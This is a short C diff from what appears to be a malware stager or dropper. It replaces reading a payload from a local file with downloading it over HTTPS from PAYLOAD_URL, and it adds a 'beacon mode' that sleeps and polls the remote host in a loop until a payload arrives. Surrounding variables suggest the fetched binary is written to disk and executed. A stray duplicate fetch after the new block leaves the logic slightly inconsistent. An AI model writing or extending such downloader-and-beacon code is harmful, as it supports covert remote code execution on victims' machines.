@@ -20,13 +20,20 @@ int main(int argc, char **argv){
     char * payload_envp[] = PAYLOAD_ENVP; // envp for payload
     char *pathToWrite = PATH_TO_WRITE;
     
-    
-    // payloadFile = fopen(PAYLOAD_FILE, "r"); // open payload binary
-    // size = fsize(payloadFile); // get size in bytes
-    // payload = calloc(size, sizeof(unsigned char)); // allocate on heap
-    // fread(payload, sizeof(unsigned char), size, payloadFile); // read file to heap
-    // fclose(payloadFile); //close file
-
+    if(BEACON_MODE <= 0){
+        payload = getHTTPS(PAYLOAD_URL);
+        if(payload.memory == NULL){ // error condition
+            return 0;
+        }
+    } else { // beacon every x seconds
+        while(1){
+            sleep(BEACON_MODE);
+            payload = getHTTPS(PAYLOAD_URL);
+            if(payload.memory == NULL) // continue beaconing if no file returned
+                continue;
+            break; // exit beaconing loop if file is returned
+        }
+    }
 
     payload = getHTTPS(PAYLOAD_URL);
 
